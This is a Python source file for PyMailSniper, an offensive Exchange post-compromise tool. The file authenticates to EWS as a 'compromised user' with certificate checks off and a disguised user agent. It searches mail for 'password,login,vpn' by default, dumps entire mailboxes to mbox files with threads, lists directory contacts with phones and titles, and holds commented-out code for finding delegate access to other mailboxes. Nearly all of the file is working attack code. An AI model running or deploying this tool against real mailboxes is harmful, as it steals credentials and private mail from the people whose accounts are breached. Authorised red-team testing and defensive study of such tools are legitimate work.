#!/usr/bin/env python3
import re
from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
    NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList
from exchangelib.errors import UnauthorizedError, CASError
import mailbox
import html2text
from requests_ntlm import HttpNtlmAuth
import requests
import requests.adapters
import mailbox
import argparse
import sys
import logging
import os
import datetime
from os.path import isfile
import math
import tqdm
import time
import getpass
import threading
import urllib3
import lxml.etree as etree

messages_per_thread = None

# ignore certificate errors and suspend warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
BaseProtocol.USERAGENT = "Auto-Reply/0.1.0"


def loggerCreate(params):
    logger = logging.getLogger('pymailsniper')
    logger.setLevel(logging.DEBUG)

    # Output response to a File
    filename = logging.FileHandler(params.get("output"))
    filename.setLevel(logging.DEBUG)
    logger.addHandler(filename)

    # Output response to Screen
    screenOutput = logging.StreamHandler(sys.stdout)
    screenOutput.setLevel(logging.DEBUG)
    logger.addHandler(screenOutput)

    return logger


# Function to setup an Exchangelib Account object to be used throughout the code
def acctSetup(params):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')
    shared = params.get('delegated')

    try:
        config = Configuration(
            server=server, credentials=Credentials(email, password), retry_policy=FaultTolerance(max_wait=3),
            max_connections=2)

        if params.get('delegated'):
            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)
        else:
            account = Account(primary_smtp_address=email,
                              autodiscover=False, config=config, access_type=DELEGATE)

        return account
    except Exception as e:
        print(f'[!] Error while connecting:\n{e}')


# List folders from a users inbox
def list_folders(accountObject, params=None):  # tree_view=False, count=False, root=False):
    root = params.get('root')
    tree_view = not params.get('absolute')
    print_count = params.get('print_count')

    root_folder = accountObject.root if root else accountObject.msg_folder_root
    # 'Top of Information Store'

    print('\n' + f'[+] Folder List for {params.get("email")}' + '\n')

    if tree_view and not print_count:
        print(root_folder.tree())
        print("\n[=] Done\n")
        return
    elif tree_view and print_count:
        tree = root_folder.tree() + "\n"  # .split("\n")
        # if tree_view and count:
        for folder_object in root_folder.walk():
            # folder_childs = f' (folders: {folder_object.child_folder_count}, emails: {folder_object.total_count})'
            folder_childs = f"emails: {folder_object.total_count}" if folder_object.total_count else ""
            folder_childs += "\t" if folder_object.total_count and folder_object.child_folder_count else ""
            folder_childs += f'folders: {folder_object.child_folder_count}' if folder_object.child_folder_count else ""

            # tree = tree.replace(folder_object.name + "\n", "{:50s} {}\n".format(folder_object.name, folder_childs))
            regex = f"(?<=(\n)).*({folder_object.name.replace('?', '.')})\n"

            try:
                result = re.search(regex, tree)
                result = result.group(0)
                tree = tree.replace(result, "{:50s} {}\n".format(result[:-1], folder_childs))
            except Exception as e:
                print("[!] Exception during printint folders: ")
                print(e)
                pass

        print(tree)
        print("\n[=] Done\n")
        return

    if not tree_view:
        for folder_object in root_folder.walk():
            info_to_print = folder_object.absolute
            if print_count:
                folder_childs = f"emails: {folder_object.total_count}" if folder_object.total_count else ""
                folder_childs += " " if folder_object.total_count and folder_object.child_folder_count else ""
                folder_childs += f'folders: {folder_object.child_folder_count}' if folder_object.child_folder_count else ""
                print("{:26s} {}".format(folder_childs, info_to_print))
            else:
                print(info_to_print)
        print("\n[=] Done\n")


def get_search_output_from_email(email=None, matches_output=None):
    sender = f"{email.sender.name} <{email.sender.email_address}>"
    # author = f"{email.author.name} <{email.author.email_address}>"
    recipients = "".join(
        [f"{recipient.name} <{recipient.email_address}>, " for recipient in email.to_recipients])[:-2]
    sent = email.datetime_sent
    subject = email.subject
    attach = email.has_attachments
    output = f"""
{'=' * 70}
ID: {email.id}

Sender:      {sender}
Recipients:  {recipients}
Sent:        {sent}
Subject:     {subject}
Attachments: {attach}

{matches_output}
    """
    return output


def sanitise_message_text_body(msg_text_body=None):
    msg_text_body = msg_text_body.replace('\r', '').replace('\n\n', '\n').replace('\n \n', '\n').replace('\n', '\\n ')
    msg_text_body = re.sub(r"\s{3,}", " ", msg_text_body)
    return msg_text_body


# TODO: use regex

# Search users email for specified terms
def search_emails(accountObject, params):
    search_folder = params.get("folder")  # default Inbox
    terms = params.get("terms")
    # count = params.get("count")  # find usage
    # adding .mbox extension if there is no this one
    mbox_output = params.get('dump')
    mbox_output = mbox_output + '.mbox' if mbox_output and '.mbox' not in mbox_output else mbox_output

    found_emails_IDs_not_checked = list()
    where_to_search = params.get('field')
    # TODO ADD len of result printing for regex

    if mbox_output and os.path.isfile(mbox_output):
        print(f"\n[!] File {mbox_output} already exist, exiting\n")
        return

    if len(terms) > 1:
        termList = terms.split(',')
    elif type(terms) == list:
        termList = terms[0].split(',')
    else:
        termList = terms

    # if params.get("delegated"):
    if search_folder.lower() == "inbox":
        base_folder = accountObject.inbox
    elif search_folder.lower() == "sent":
        base_folder = accountObject.sent
    # TODO look all folders
    #
    # elif search_folder.lower() == "all":
    #     base_folder = accountObject.msg_folder_root
    else:
        base_folder = findFolder(accountObject=accountObject, folder_to_find=search_folder)
        if not base_folder:
            print(f"\n[-] Folder {search_folder} not found")
            return 1

    emails_for_search = base_folder.all().order_by('-datetime_received').values_list('id', 'changekey')

    if where_to_search == 'body':
        print('\n[+] Searching Email body for {} in {} Folder [+]'.format(terms, base_folder.name) + '\n')
        for term in termList:
            found_emails_IDs_not_checked.append(list(emails_for_search.filter(body__contains=term)))
    elif where_to_search == 'subject':
        print('\n[+] Searching Email Subject for {} in "{}" Folder [+]'.format(terms, base_folder.name) + '\n')
        for term in termList:
            found_emails_IDs_not_checked.append(list(emails_for_search.filter(subject__contains=term)))

    # making flat list (list of lists into list) and then converting to set for non duplicating
    found_emails_IDs_not_checked = set([item for sublist in found_emails_IDs_not_checked for item in sublist])

    if len(found_emails_IDs_not_checked) == 0:
        print(f"[=] Nothing found\n")
        return

    # Used for non repeating allready found matches
    already_found_substrings = []

    # for found_email_group in found_emails:
    # with open(datetime.datetime.today().strftime('Last_search_output.txt'), 'w', encoding='utf8') as writer:

    # just an iterator
    found_emails_data = accountObject.fetch(found_emails_IDs_not_checked,
                                            only_fields=['text_body', 'cc_recipients', 'sender', 'to_recipients',
                                                         'subject', 'datetime_sent', 'has_attachments'])

    found_checked_emails_IDs = []

    for email in found_emails_data:

        # just removes \r, replacing \n to \\n and \S+ to " " (space)
        clear_message_text_body = sanitise_message_text_body(email.text_body)

        if where_to_search == 'body':
            # re_check is needed for excluding false-positive search results
            re_check = [term.lower() in clear_message_text_body.lower() for term in termList]

            # if any of terms not found by regex in message text body, going next
            if not any(re_check):
                continue

        try:
            if where_to_search == 'body':
                # searching by regex (\w+.{0,50}(term1|term2|term3).{0,50}\w+), returns up to 50 + %last_word_len% chars before and after terms
                regex = '(\w+.{0,50}(' + "|".join(termList) + ').{0,50}\w+)'

                # searching with ignoring case and getting a list of substrings found by regex
                found_substrings = re.findall(regex, clear_message_text_body, re.IGNORECASE)
                found_substrings = [i[0] for i in found_substrings if i[0] not in already_found_substrings]

                if len(found_substrings) == 0:
                    continue
                    # Just how found matches will be printed later
                matches_output = "".join(
                    [f"\nMatch {index + 1}: \n...{match}...\n".replace('\\n \\n', '') for index, match in
                     enumerate(found_substrings)])
                # saving found matches for non repeating
                already_found_substrings += found_substrings
            elif where_to_search == 'subject':
                # we have no text matches for subject, so printing first 100 chars of body
                matches_output = clear_message_text_body[:100]

            # saving found emails (id,changekey) for later downloading
            found_checked_emails_IDs.append((email.id, email.changekey))

            # just getting output for print
            result_for_printing = get_search_output_from_email(email=email, matches_output=matches_output)
            print(result_for_printing)
            # writer.write(output)

        except Exception as e:
            print("[!] Exception while searching: ")
            print(e)

    if mbox_output:
        found_emails_mimes = get_emails(accountObject=accountObject, email_ids_to_download=found_checked_emails_IDs,
                                        tqdm_description="Downloading search results")
        dump_to_Mbox(mbox_file_path=mbox_output, mimes_list=found_emails_mimes,
                     tqdm_desctiption=f"[+] Saving found to {mbox_output}")

    with open('last_search.ids', 'w', encoding='utf8') as writer:
        for email in found_emails_IDs_not_checked:
            writer.write(str(found_emails_IDs_not_checked))


# Search for attachments based on search terms provided
def searchAttachments(accountObject, params):
    folder = params.get("folder")
    terms = params.get("terms")
    count = params.get("count")

    if len(terms) > 1:
        termList = terms.split(',')
    else:
        termList = terms

    if params.get("delegated"):
        searchFolder = accountObject.inbox
    else:
        searchFolder = accountObject.root / 'Top of Information Store' / folder
    if params.get("field") == 'body':
        for term in termList:
            searchResult = searchFolder.filter(body__contains=term)[:count]
    else:
        for term in termList:
            searchResult = searchFolder.filter(subject__contains=term)[:count]

    print('[+] Attachment List for Compromised Users with search term {} in {} Folder'.format(terms, folder) + '\n')
    if params.get("directory"):
        print('[+] Saving Attachments [+]')
    for emails in searchResult:
        for attachment in emails.attachments:
            print('From: {} | Subject: {} | Attachment: {}'.format(
                emails.author.email_address, emails.subject, attachment.name))
            if params.get("directory"):
                if isinstance(attachment, FileAttachment):
                    local_path = os.path.join(
                        params.get("directory"), attachment.name)
                    with open(local_path, 'wb') as f, attachment.fp as fp:
                        buffer = fp.read(1024)
                        while buffer:
                            f.write(buffer)
                            buffer = fp.read(1024)
    print('\n' + 'Saved attachment to', params.get("directory"))


# Check where compromised user has delegation rights
def searchDelegates(params, fparser):
    server = params.get('server')
    email = params.get('email')
    password = params.get('password')

    if isinstance(fparser.get("galList"), (str)):
        fname = ''.join(fparser.get("galList"))
        fname = fname.split(' ')
    else:
        fname = fparser.get("galList")

    print('[+] Checking Where Compromised User Has Access' + '\n')

    for shared in fname:
        try:
            config = Configuration(
                server=server, credentials=Credentials(email, password))

            account = Account(primary_smtp_address=shared,
                              autodiscover=False, config=config, access_type=DELEGATE)

            folderInbox = account.inbox
            # print(folderInbox.permission_set)
            for s in folderInbox.permission_set.permissions:
                if s.permission_level != 'None':
                    print('User: {} has {} permissions on {}\'s Inbox'.format(email, s.permission_level, shared))

        except Exception as e:
            if 'The specified object was not found in the store., The process failed to get the correct properties' not in str(
                    e):
                print(e)


def list_contacts(accountObject=None, params=None):
    """Prints all user email addresses"""
    """GAL NOT TESTED"""
    is_gal = params.get('gal')
    verbose = params.get('verbose')
    if is_gal:
        folder = accountObject.contacts / 'GAL Contacts'
        print("\n[+] GAL Contacts")
        gal = accountObject.contacts / 'GAL Contacts'
        all_addresses = [
            e.email for c in gal.all()
            for e in c.email_addresses if not isinstance(c, DistributionList)
        ]
    else:
        print("\n[+] AllContacts")
        folder = accountObject.root / 'AllContacts'
        for person in folder.people():
            emails = "".join([email.email_address + '\n' for email in person.email_addresses])[
                     :-1] if person.email_addresses else person.email_address
            if not verbose:
                print(emails)
                continue
            display_name = person.display_name
            company_name = person.company_name if person.company_name else None
            office_locations = "".join([location.value + '\n' for location in person.office_locations])[
                               :-1] if person.office_locations else None
            titles = "".join([title.value + '\n' for title in person.titles])[:-1] if person.titles else person.title
            department = person.department if person.department else None
            mobile_phones = "".join([phone.value.number + '\n' for phone in person.mobile_phones])[
                            :-1] if person.mobile_phones else None
            business_phone_numbers = "".join([phone.value.number + '\n' for phone in person.business_phone_numbers])[
                                     :-1] if person.business_phone_numbers else None
            verbose_output = f"""
{"Display name:   " + display_name if display_name else ""}
{"Company name:   " + company_name if company_name else ""}
{"Location:       " + office_locations if office_locations else ""}
{"Title:          " + titles if titles else ""}
{"Department:     " + department if department else ""}
{"Mobile phone:   " + mobile_phones if mobile_phones else ""}
{"Business phone: " + business_phone_numbers if business_phone_numbers else ""}
{"Emails:         " + emails if emails else ""}
            """.replace('\n\n', '\n').replace('\n\n', '\n').replace('\n\n', '\n')[:-1]
            """Don't look at this, please"""

            print(verbose_output)
    print()


# This is where we check if the address list file provided exists
def file_parser(params):
    return_dict = {}

    if isfile(params.get("galList")):
        with open(params.get("galList", "r")) as f:
            userfile_content = f.read().splitlines()
            f.close()
            return_dict['galList'] = userfile_content
    elif isinstance(params.get("galList"), str):
        return_dict['galList'] = params.get("galList")
    else:
        print("GAL File not found!")

    return return_dict


def print_logo():
    logo = '''
  _____       __  __       _ _  _____       _                 
 |  __ \     |  \/  |     (_) |/ ____|     (_)                
 | |__) |   _| \  / | __ _ _| | (___  _ __  _ _ __   ___ _ __ 
 |  ___/ | | | |\/| |/ _` | | |\___ \| '_ \| | '_ \ / _ \ '__|
 | |   | |_| | |  | | (_| | | |____) | | | | | |_) |  __/ |   
 |_|    \__, |_|  |_|\__,_|_|_|_____/|_| |_|_| .__/ \___|_|   
         __/ |                               | |              
        |___/                                |_|              
        
   '''

    print(logo)


def findFolder(accountObject=None, folder_to_find=None):
    # TODO: do someting if returned more than 1 folder
    found = list(accountObject.msg_folder_root.glob(folder_to_find))[0]
    return found


def sanitise_file_path(file_path=None):
    return re.sub(r"[^\sа-яА-ЯёЁ0-9a-zA-Z\]\[]+", " ", file_path)


def dump_to_Mbox(folder_name=None, mbox_file_path=None, mimes_list=[], tqdm_desctiption=""):
    try:
        # look at this magic (list of lists into flat list)
        if type(mimes_list[0]) == list:
            mimes_list = [item for sublist in mimes_list for item in sublist]

        mbox = mailbox.mbox(mbox_file_path)
        mbox.lock()
        for message_index in tqdm.tqdm(range(len(mimes_list)), desc=tqdm_desctiption, leave=False, unit="email"):
            msg = mailbox.mboxMessage(mimes_list[message_index])
            mbox.add(msg)
            mbox.flush()
        mbox.unlock()
    except Exception as e:
        print(f"[-] Error while saving to {mbox_file_path}:")
        print(e)
    finally:
        size = os.path.getsize(mbox_file_path)
        size = size / (1024 * 1024)
        info = "({} emails {:.3f} MB)".format(str(len(mimes_list)), size)
        if folder_name:
            print("[+] Folder {:25s} dumped to {} {:>18}".format('"' + folder_name + '"', mbox_file_path, info))
        else:
            print("[+] Dumped to {} {:>18}".format(mbox_file_path, info))


def dump_thread_worker(accountObject=None, folder_name=None, thread_index=None, params=None,
                       email_ids_to_download=None):
    global messages_per_thread
    exception_string = f"[!] Thread {thread_index} is reconnected!"
    if folder_name:
        tqdm_description = f"[+] Downloading \"{folder_name}\""
        if params.get('threads') != 1:
            tqdm_description += f' (Thr №{thread_index})'
    else:
        tqdm_description = ""

    # ids of emails for downloading in "email_ids_to_download", list where mime_contents will be returned - "list_for_results"
    messages_per_thread[thread_index] = get_emails(accountObject=accountObject,
                                                   email_ids_to_download=email_ids_to_download,
                                                   tqdm_description=tqdm_description, exception_string=exception_string)

    accountObject.protocol.close()


def get_emails(accountObject=None, email_ids_to_download=None, tqdm_description=None,
               exception_string="Exception while downloading, reconnecting..."):
    downloaded_messages = []
    # you can play with "count_per_task" parameter for performance, but in my case by one is fastest
    count_per_task = 1

    for i in tqdm.tqdm(range(0, len(email_ids_to_download), count_per_task), desc=tqdm_description, leave=False,
                       unit="email"):
        # takes list of N ids of emails and downloading its mime (plain .eml file)
        # while True needed if connection was lost:
        while True:
            try:

                temp = email_ids_to_download[i:i + count_per_task]
                for mime in accountObject.fetch(temp, only_fields=['mime_content']):
                    downloaded_messages.append(mime.mime_content)
                break

            except Exception as e:
                # accountObject = acctSetup(params)
                # print(e)
                print(exception_string)
                continue

    return downloaded_messages


def dumper(accountObject=None, params=None):
    # брать папку из аргументов если dump all -d "папка куда"

    base_folder = None
    folder_to_dump = params.get('folder')
    local_folder = params.get('dump_folder')
    emails_count = params.get('count')

    if folder_to_dump.lower() == "inbox":
        base_folder = accountObject.inbox
    elif folder_to_dump.lower() == "sent":
        base_folder = accountObject.sent
    elif folder_to_dump.lower() == "all":
        base_folder = accountObject.msg_folder_root
    else:
        base_folder = findFolder(accountObject=accountObject, folder_to_find=folder_to_dump)
        if not base_folder:
            print(f"\n[-] Folder {local_folder} not found")
            return 1

    if os.path.isdir(local_folder):
        print(f"\n[-] Folder {local_folder} allready exists, use another (-d)")
        return 1
    else:
        try:
            os.mkdir(local_folder)
            print(f"\n[+] Folder \"{local_folder}\" created\n")
        except Exception as e:
            print(f"\n[-] Something went wrong while creating {local_folder}:")
            print(e)
            return 1

    all_folders_2_dump = [base_folder]
    # Adding subfolders
    all_folders_2_dump += [folder for folder in base_folder.walk()]
    # to-do : filter folders without emails like calendar

    for folder in all_folders_2_dump:
        # If no messages in folder going next:
        if folder.total_count == 0:
            continue

        global messages_per_thread

        thread_count = params.get('threads')

        # rudiment?
        # mbox_file_path = (folder.absolute).replace(base_folder.absolute + "/", "")
        mbox_file_path = "[" + folder.parent.name + "] " if folder.parent.name not in [base_folder.name,
                                                                                       accountObject.msg_folder_root.name] else ""
        mbox_file_path += folder.name
        mbox_file_path = sanitise_file_path(mbox_file_path)
        mbox_file_path = f"./{local_folder}/{mbox_file_path}.mbox"

        # just IDs of emails in folder

        if not params.get('count'):
            emails_count = folder.total_count

        all_items = list(
            folder.all().order_by('-datetime_received').values_list('id', 'changekey')[:emails_count])

        if len(all_items) == 0:
            continue

        threads_lists = []

        # its really better
        if len(all_items) <= 10:
            thread_count = 1

        messages_per_thread = [[]] * thread_count

        messages_count_per_thread = int(math.ceil(len(all_items) / thread_count))

        items_per_thread = []

        # emails_count - 1 is eq to len(all_items)
        for i in range(0, emails_count - 1, messages_count_per_thread):
            items_per_thread.append(all_items[i:i + messages_count_per_thread])

        accountObjects = [None] * thread_count

        for index in range(thread_count):
            # one connection per thread
            if len(items_per_thread[index]) == 0:
                continue
            accountObjects[index] = acctSetup(parsed_arguments)
            t = threading.Thread(target=dump_thread_worker,
                                 kwargs={'accountObject': accountObjects[index],
                                         'email_ids_to_download': items_per_thread[index],
                                         'folder_name': folder.name, 'thread_index': index, 'params': params})
            threads_lists.append(t)
            t.start()

        for t in threads_lists:
            t.join()

        dump_to_Mbox(mbox_file_path=mbox_file_path,
                     mimes_list=messages_per_thread, folder_name=folder.name,
                     tqdm_desctiption=f"[+] Saving folder \"{folder.name}\"")

    print("\n[=] All folders downloaded")


def do_autodiscover(params=None):
    print("\n[+] Performing autodiscover request\n")
    server = params.get('server').replace("https://", "").replace("http://", "")
    email = params.get('email')
    password = params.get('password')
    url = "https://" + server + "/autodiscover/autodiscover.xml"
    headers = {
        "Host": server,
        'Content-Type': 'text/xml',
    }
    autodiscover_request_body = f"""
    <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
    <Request>
      <EMailAddress>{email}</EMailAddress>
      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
    </Request>
    </Autodiscover>
    """
    response = requests.post(url, data=autodiscover_request_body, headers=headers, auth=HttpNtlmAuth(email, password),
                             verify=False)

    print(response.text)


if __name__ == "__main__":
    # This is where we start parsing arguments
    banner = "# PyMailSniper [http://www.foofus.net] (C) sph1nx Foofus Networks <sph1nx@foofus.net>"
    banner += "\n# Fork By HydroSausager\n"

    print_logo()
    print(banner)
    parser = argparse.ArgumentParser(description='Python implementation of mailsniper',
                                     usage='python3 pymailsniper.py -s mail.server.com -e email@email.com action object [action options]')

    parser.add_argument('-s', '--remote-server', action="store",
                        dest="server", help='EWS URL for Mail Server')
    parser.add_argument('-e', '--email', action="store",
                        dest="email", help='Email address of compromised user')
    parser.add_argument('-p', '--password', action="store",
                        dest="password", help='Password, leave empty for prompt')

    # subparsers init
    subparsers = parser.add_subparsers(title='action', dest='action')
    # subparsers init
    list_subparser = subparsers.add_parser('list', help='perform list of objects', add_help=True)
    search_subparser = subparsers.add_parser('search', help='perform search of objects', add_help=True)
    dump_subparser = subparsers.add_parser('dump', help='perform downloading of objects', add_help=True)
    autodiscover_subparser = subparsers.add_parser('autodiscover', help='Perform autodiscover request and exit',
                                                   add_help=True)

    #
    # list action subparser args
    list_subparser.add_argument('-a', '--absolute', action='store_true', default=False,
                                help='Folders - folders absolute paths instead tree if arg is present')
    list_subparser.add_argument('-pc', '--print-count', action='store_true', default=False,
                                help='Folders - print count of child folders and email if present')
    list_subparser.add_argument('-r', '--root', action='store_true', default=False,
                                help='Folders - Use "root" folder as root for printing insted of "Top Information Store"')
    list_subparser.add_argument('-g', '--gal', action='store_true', default=False,
                                help='Contacts - Use GAL insted of "AllAccount"')
    list_subparser.add_argument('-v', '--verbose', action='store_true', default=False,
                                help='Contacts - Print additional info about contacts"')
    list_subparser.add_argument('object', choices=['folders', 'emails', 'contacts'], type=str)

    #
    # dump action subparser args
    dump_subparser.add_argument('-d', '--dump-folder', action='store',
                                default=datetime.datetime.today().strftime('Dump %Y-%m-%d %H-%M'),
                                help='Local folder to store .mbox dumps, default - "DUMP" + current datetime')
    dump_subparser.add_argument('-c', '--count', action='store', default=None, type=int,
                                help='Count of N last emails in folder to dump')
    dump_subparser.add_argument('-t', '--threads', action='store', default="1", type=int,
                                help='Threads count for dumping (experimental - NOT SUCH EFFECTIVE)')
    dump_subparser.add_argument('-f', '--folder', action='store', default="Inbox",
                                help='Folder name (on server) to dump, ("all", "Inbox", "Sent" also avaliable)')
    dump_subparser.add_argument('object', choices=['folders', 'emails', 'contacts'], type=str)

    #
    # search action subparser args
    search_subparser.add_argument('-f', '--folder', action="store", dest="folder", metavar=' ',
                                  help='Folder to search through', default='Inbox')
    search_subparser.add_argument('-t', '--terms', action="store",
                                  dest="terms", metavar=' ',
                                  help='String to Search (Comma separated for multiple terms)',
                                  nargs='+', type=str, default='password,login,vpn')
    # search_subparser.add_argument('-c', '--count', action="store",
    #                               dest="count", metavar=' ', help='Number of emails to search', type=int)
    search_subparser.add_argument('--field', action="store", default='body',
                                  dest="field", help='Email field to search. Default is subject',
                                  choices=['subject', 'body'])
    search_subparser.add_argument('object', choices=['folders', 'emails'], type=str)
    search_subparser.add_argument('--dump', action='store', default=None,
                                  help='Dump found to name.mbox file')

    # TODO: CLEAR THIS SHIT AND ADD DEBUG MODE
    # search_subparser.add_argument('--delegated', action="store",
    #                               dest="delegated", help='Mailbox with access')
    # search_subparser.add_argument('-o', '--output', action="store",
    #                               dest="output", metavar=' ', help='Filename to save emails', required=True)

    # object_subparser = action_subparser.add_subparsers(title='object', dest='objects', description='objects for action')

    # optional_parser = argparse.ArgumentParser(add_help=False)

    # list parser init
    # list_parser = subparsers.add_parser('list', help='List: folders, emails, contacts', parents=[optional_parser])
    #
    # # list folders init
    # folder_parser = subparsers.add_parser('folders', add_help=False, parents=[list_parser])

    #
    # list emails init
    # not implemented yet
    # emails_parser = subparsers.add_parser('emails', add_help=False, parents=[list_parser])
    #
    # list contacts init
    # contacts_parser = subparsers.add_parser('contacts', add_help=False, parents=[list_parser])
    #
    # list_parser = subparsers.add_parser('list', help='List: folders, emails, contacts', parents=[optional_parser])
    #
    # dump_parser = subparsers.add_parser(
    #     'dump', help="Download emails", parents=[optional_parser])
    # dump_parser.add_argument('folder', action='store', default="Inbox",
    #                          help='Folder to dump')

    #
    # attach_parser = subparsers.add_parser(
    #     'attachment', help="List/Download Attachments", parents=[optional_parser])
    # attach_parser.add_argument('-d', '--directory', action="store",
    #                            dest="directory", help='Directory to download attachments', metavar=' ')
    # attach_parser.add_argument('-t', '--terms', action="store",
    #                            dest="terms", metavar=' ', help='String to Search (Comma separated for multiple terms)',
    #                            nargs='+', type=str, default='RSA,token,VPN')
    # attach_parser.add_argument('-f', '--folder', action="store",
    #                            dest="folder", metavar=' ', help='Folder to search through', default='Inbox')
    # attach_parser.add_argument('-c', '--count', action="store",
    #                            dest="count", metavar=' ', help='Number of emails to search', type=int, default='10')
    # attach_parser.add_argument('--field', action="store",
    #                            dest="field", help='Email field to search. Default is subject',
    #                            choices=['subject', 'body'])
    #
    # delegate_parser = subparsers.add_parser(
    #     'delegation', help="Find where compromised user has access", parents=[optional_parser])
    # delegate_parser.add_argument('-g', '--gal', action="store",
    #                              dest="galList", metavar=' ', help='List of email addresses to check access',
    #                              required=True)
    #
    # email_parser = subparsers.add_parser('emails', help="Search for Emails", parents=[optional_parser])

    args = parser.parse_args()
    parsed_arguments = vars(args)  # Convert Args to a Dictionary

    # exit()
    # for key, val in parsed_arguments.items():
    #     print(f'{key} = {val}')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    print(f"[+] Email - {args.email}, server - {args.server}")

    if not args.password:
        args.password = getpass.getpass(prompt='Password: ', stream=None)

    if parsed_arguments.get("galList"):
        fileparser = file_parser(parsed_arguments)

    # if parsed_arguments.get("output"):
    #     loghandle = loggerCreate(parsed_arguments)

    if parsed_arguments['action'] != 'autodiscover':
        accountObj = acctSetup(parsed_arguments)

        if accountObj is None:
            print('[=] Could not connect to MailBox\n\n')
            sys.exit()
    else:
        do_autodiscover(params=parsed_arguments)
        sys.exit()

    start_time = time.time()

    action = parsed_arguments['action']
    action_object = parsed_arguments['object']

    if action == 'list':
        if action_object == 'emails':
            print('NOT IMPLEMENTED YET!')
        if action_object == 'contacts':
            list_contacts(accountObject=accountObj, params=parsed_arguments)
        if action_object == 'folders':
            list_folders(accountObject=accountObj, params=parsed_arguments)
    elif action == 'dump':
        if action_object == 'emails':
            print('NOT IMPLEMENTED YET!')
        if action_object == 'contacts':
            print('NOT IMPLEMENTED YET!')
        if action_object == 'folders':
            dumper(accountObj, params=parsed_arguments)

    # list_folders(accountObject=accountObj, params=parsed_arguments)
    elif action == 'search':
        if action_object == 'emails':
            search_emails(accountObj, parsed_arguments)
        if action_object == 'contacts':
            print('NOT IMPLEMENTED YET!')
        # list_contacts(accountObject=accountObj,params=parsed_arguments)
        if action_object == 'folders':
            print('NOT IMPLEMENTED YET!')
            # list_folders(accountObject=accountObj, params=parsed_arguments)

    # TODO: Разобраться с этим
    # elif parsed_arguments['modules'] == 'attachment':
    #     searchAttachments(accountObj, parsed_arguments)
    # elif parsed_arguments['modules'] == 'delegation':
    #     searchDelegates(parsed_arguments, fileparser)

    print("[=] Took time: {:.3f} min\n\n".format((time.time() - start_time) / 60))

    # to-do get file sizes
